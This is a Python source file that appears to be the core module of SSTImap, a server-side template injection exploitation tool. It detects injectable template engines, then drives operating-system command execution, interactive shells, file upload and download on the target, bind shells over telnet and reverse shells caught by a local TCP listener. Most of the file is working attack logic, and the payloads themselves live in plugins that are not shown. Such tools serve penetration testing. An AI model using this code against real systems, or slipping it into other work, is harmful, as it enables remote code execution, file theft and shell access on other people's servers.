from plugins.engines.mako import Mako
from plugins.engines.jinja2 import Jinja2
from plugins.engines.twig import Twig
from plugins.engines.freemarker import Freemarker
from plugins.engines.velocity import Velocity
from plugins.engines.pug import Pug
from plugins.engines.nunjucks import Nunjucks
from plugins.engines.dust import Dust
from plugins.engines.dot import Dot
from plugins.engines.tornado import Tornado
from plugins.engines.marko import Marko
from plugins.engines.slim import Slim
from plugins.engines.erb import Erb
from plugins.engines.ejs import Ejs
from plugins.engines.smarty import Smarty
from plugins.languages.javascript import Javascript
from plugins.languages.php import Php
from plugins.languages.python import Python
from plugins.languages.ruby import Ruby
from plugins.legacy_engines.smarty_unsecure import Smarty_unsecure
from utils.loggers import log
from core.clis import Shell, MultilineShell
from core.tcpserver import TcpServer
import telnetlib
from urllib import parse
import socket


def plugins(legacy=False):
    plugin_list = []
    if legacy:
        plugin_list.extend([
            Smarty_unsecure,
        ])
    plugin_list.extend([
        Smarty,
        Mako,
        Python,
        Tornado,
        Jinja2,
        Twig,
        Freemarker,
        Velocity,
        Slim,
        Erb,
        Pug,
        Nunjucks,
        Dot,
        Dust,
        Marko,
        Javascript,
        Php,
        Ruby,
        Ejs
    ])
    return plugin_list


def print_injection_summary(channel):
    prefix = channel.data.get('prefix', '').replace('\n', '\\n')
    render = channel.data.get('render', '{code}').replace('\n', '\\n').format(code='*')
    suffix = channel.data.get('suffix', '').replace('\n', '\\n')
    if channel.data.get('evaluate_blind'):
        evaluation = f"\033[92mok\033[0m, {channel.data.get('language')} code (blind)"
    elif channel.data.get('evaluate'):
        evaluation = f"\033[92mok\033[0m, {channel.data.get('language')} code"
    else:
        evaluation = '\033[91mno\033[0m'
    if channel.data.get('execute_blind'):
        execution = '\033[92mok\033[0m (blind)'
    elif channel.data.get('execute'):
        execution = '\033[92mok\033[0m'
    else:
        execution = '\033[91mno\033[0m'
    if channel.data.get('write'):
        if channel.data.get('blind'):
            writing = '\033[92mok\033[0m (blind)'
        else:
            writing = '\033[92mok\033[0m'
    else:
        writing = '\033[91mno\033[0m'
    log.log(21, f"""SSTImap identified the following injection point:

  {channel.injs[channel.inj_idx]['field']} parameter: {channel.injs[channel.inj_idx]['param']}
  Engine: {channel.data.get('engine').capitalize()}
  Injection: {prefix}{render}{suffix}
  Context: {'text' if (not prefix and not suffix) else 'code'}
  OS: {channel.data.get('os', 'undetected')}
  Technique: {'blind' if channel.data.get('blind') else 'render'}
  Capabilities:

    Shell command execution: {execution}
    Bind and reverse shell: {f'{chr(27)}[91mno{chr(27)}[0m' if not channel.data.get('bind_shell') else f'{chr(27)}[92mok{chr(27)}[0m'}
    File write: {writing}
    File read: {f'{chr(27)}[91mno{chr(27)}[0m' if not channel.data.get('read') else f'{chr(27)}[92mok{chr(27)}[0m'}
    Code evaluation: {evaluation}
""")


def detect_template_injection(channel):
    for i in range(len(channel.injs)):
        log.log(23, f"Testing if {channel.injs[channel.inj_idx]['field']} parameter '{channel.injs[channel.inj_idx]['param']}' is injectable")
        for plugin in plugins(channel.args.get('legacy')):
            current_plugin = plugin(channel)
            if channel.args.get('engine') and channel.args.get('engine').lower() != current_plugin.plugin.lower():
                continue
            current_plugin.detect()
            if channel.data.get('engine'):
                return current_plugin
        channel.inj_idx += 1


def check_template_injection(channel):
    current_plugin = detect_template_injection(channel)
    if not channel.data.get('engine'):
        log.log(22, "Tested parameters appear to be not injectable.")
        return current_plugin
    print_injection_summary(channel)
    if not any(f for f, v in channel.args.items() if f in ('os_cmd', 'os_shell', 'upload', 'download', 'tpl_shell',
                                                           'tpl_code', 'bind_shell', 'reverse_shell', 'eval_shell',
                                                           'eval_code', 'interactive') and v):
        log.log(21, f"""Rerun SSTImap providing one of the following options:{'''
    --os-shell                   Prompt for an interactive operating system shell
    --os-cmd                     Execute an operating system command.''' if channel.data.get('execute') or channel.data.get('execute_blind') else ''}{'''
    --eval-shell                 Prompt for an interactive shell on the template engine base language.
    --eval-cmd                   Evaluate code in the template engine base language.''' if channel.data.get('evaluate') or channel.data.get('evaluate_blind') else ''}{'''
    --tpl-shell                  Prompt for an interactive shell on the template engine.
    --tpl-cmd                    Inject code in the template engine.''' if channel.data.get('engine') else ''}{'''
    --bind-shell PORT            Connect to a shell bind to a target port''' if channel.data.get('bind_shell') else ''}{'''
    --reverse-shell HOST PORT    Send a shell back to the attacker's port''' if channel.data.get('reverse_shell') else ''}{'''
    --upload LOCAL REMOTE        Upload files to the server''' if channel.data.get('write') else ''}{'''
    --download REMOTE LOCAL      Download remote files''' if channel.data.get('read') else ''}""")
        return current_plugin
    # Execute operating system commands
    if channel.args.get('os_cmd') or channel.args.get('os_shell'):
        if channel.data.get('execute_blind'):
            log.log(23, """Blind injection has been found and command execution will not produce any output.""")
            log.log(26, 'Delay is introduced appending \'&& sleep <delay>\' to the shell commands. '
                        'True or False is returned whether it returns successfully or not.')
            if channel.args.get('os_cmd'):
                print(current_plugin.execute_blind(channel.args.get('os_cmd')))
            elif channel.args.get('os_shell'):
                log.log(21, 'Run commands on the operating system.')
                Shell(current_plugin.execute_blind, f"{channel.data.get('os', 'undetected')} (blind) $ ").cmdloop()
        elif channel.data.get('execute'):
            if channel.args.get('os_cmd'):
                print(current_plugin.execute(channel.args.get('os_cmd')))
            elif channel.args.get('os_shell'):
                log.log(21, 'Run commands on the operating system.')
                Shell(current_plugin.execute, f"{channel.data.get('os', 'undetected')} $ ").cmdloop()
        else:
            log.log(22, 'No system command execution capabilities have been detected on the target.')
    # Execute template commands
    if channel.args.get('tpl_code') or channel.args.get('tpl_shell'):
        if channel.data.get('engine'):
            if channel.data.get('blind'):
                log.log(23, 'Only blind execution has been found. '
                            'Injected template code will not produce any output.')
                call = current_plugin.inject
            else:
                call = current_plugin.render
            if channel.args.get('tpl_code'):
                print(call(channel.args.get('tpl_code')))
            elif channel.args.get('tpl_shell'):
                log.log(21, 'Inject multi-line template code. '
                            'Press ctrl-D or type \'EOF\' on a new line to send the lines')
                MultilineShell(call, f"{channel.data.get('engine', '')} > ").cmdloop()
        else:
            log.log(22, 'No template code evaluation capabilities have been detected on the target')
    # Execute language commands
    if channel.args.get('eval_code') or channel.args.get('eval_shell'):
        if channel.data.get('evaluate_blind'):
            log.log(23, 'Only blind execution has been found. '
                        'Injected code will not produce any output.')
            if channel.args.get('eval_code'):
                print(current_plugin.evaluate_blind(channel.args.get('eval_code')))
            elif channel.args.get('eval_shell'):
                log.log(21, 'Evaluate multi-line template base language code. '
                            'Press ctrl-D or type \'EOF\' on a new line to send the lines')
                MultilineShell(current_plugin.evaluate_blind, f"{channel.data.get('language', '')} > ").cmdloop()
        elif channel.data.get('evaluate'):
            if channel.args.get('eval_code'):
                print(current_plugin.evaluate(channel.args.get('eval_code')))
            elif channel.args.get('eval_shell'):
                log.log(21, 'Evaluate multi-line template base language code. '
                            'Press ctrl-D or type \'EOF\' on a new line to send the lines')
                MultilineShell(current_plugin.evaluate, f"{channel.data.get('language', '')} > ").cmdloop()
        else:
            log.log(22, 'No language code evaluation capabilities have been detected on the target')
    # Perform file upload
    local_remote_paths = channel.args.get('upload')
    if local_remote_paths:
        if channel.data.get('write'):
            local_path, remote_path = local_remote_paths
            with open(local_path, 'rb') as f:
                data = f.read()
            current_plugin.write(data, remote_path)
        else:
            log.log(22, 'No file upload capabilities have been detected on the target')
    # Perform file read
    remote_local_paths = channel.args.get('download')
    if remote_local_paths:
        if channel.data.get('read'):
            remote_path, local_path = remote_local_paths
            content = current_plugin.read(remote_path)
            with open(local_path, 'wb') as f:
                f.write(content)
        else:
            log.log(22, 'No file download capabilities have been detected on the target')
    # Connect to tcp shell
    bind_shell_port = channel.args.get('bind_shell')
    if bind_shell_port:
        if channel.data.get('bind_shell'):
            urlparsed = parse.urlparse(channel.base_url)
            if not urlparsed.hostname:
                log.log(22, "Error parsing hostname")
                return current_plugin
            for idx, thread in enumerate(current_plugin.bind_shell(bind_shell_port)):
                log.log(26, f'Spawn a shell on remote port {bind_shell_port} with payload {idx+1}')
                thread.join(timeout=1)
                if not thread.is_alive():
                    continue
                try:
                    telnetlib.Telnet(urlparsed.hostname.decode(), bind_shell_port, timeout=5).interact()
                    # If telnetlib does not rise an exception, we can assume that
                    # ended correctly and return from `run()`
                    return current_plugin
                except Exception as e:
                    log.debug(f"Error connecting to {urlparsed.hostname}:{bind_shell_port} {e}")
        else:
            log.log(22, 'No TCP shell opening capabilities have been detected on the target')
    # Accept reverse tcp connections
    reverse_shell_host_port = channel.args.get('reverse_shell')
    if reverse_shell_host_port:
        host, port = reverse_shell_host_port
        timeout = 15
        if channel.data.get('reverse_shell'):
            current_plugin.reverse_shell(host, port)
            # Run tcp server
            try:
                TcpServer(int(port), timeout)
            except socket.timeout:
                log.log(22, f"No incoming TCP shells after {timeout}s, quitting.")
        else:
            log.log(22, 'No reverse TCP shell capabilities have been detected on the target')
    return current_plugin
